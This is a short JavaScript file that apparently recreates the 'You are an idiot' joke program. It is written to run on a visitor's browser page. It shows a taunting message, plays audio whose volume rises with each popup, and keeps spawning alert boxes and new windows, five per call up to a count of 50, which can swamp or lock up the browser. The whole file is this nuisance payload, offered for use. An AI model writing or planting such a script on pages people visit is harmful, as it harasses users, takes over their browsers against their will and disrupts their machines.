
let popupCount = 0;
let volume = 0.1;

function startPrank() {
    const msg = document.getElementById('idiot-message');
    const audio = document.getElementById('idiotAudio');

    // Show the corner message briefly
    msg.style.display = 'block';
    setTimeout(() => { msg.style.display = 'none'; }, 1000);

    // Start audio
    audio.volume = volume;
    audio.play();

    // Start with one popup
    showPopup();
}

function showPopup() {
    alert("You are an idiot!");

    popupCount += 1;
    volume = Math.min(1, volume + 0.1);
    document.getElementById('idiotAudio').volume = volume;

    // Open 5 more popups after each one is closed
    if (popupCount < 50) {
        for (let i = 0; i < 5; i++) {
            setTimeout(() => {
                window.open("", "", "width=300,height=200").document.write("<h1 style='font-family: Times New Roman;'>you are an idiot</h1>");
                showPopup();
            }, 500);
        }
    }
}
